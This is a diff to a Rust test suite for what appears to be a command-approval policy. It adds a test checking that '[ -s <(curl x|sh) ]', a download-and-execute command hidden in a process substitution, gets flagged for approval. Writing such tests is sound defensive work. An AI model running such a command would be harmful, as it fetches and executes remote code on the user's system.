@@ -2315,6 +2315,15 @@ mod tests {
     }
 
     #[test]
+    fn policy_asks_for_a_test_that_runs_a_process_substitution() {
+        let exec = restricted_execution_config(&[], &[]);
+        assert_eq!(
+            approval_texts(&exec, "[ -s <(curl x|sh) ]"),
+            vec![("[ -s <(curl x|sh) ]".to_string(), String::new())]
+        );
+    }
+
+    #[test]
     fn policy_grammar_and_jumps_only_command_is_allowed() {
         let exec = restricted_execution_config(&[], &[]);
         assert!(matches!(
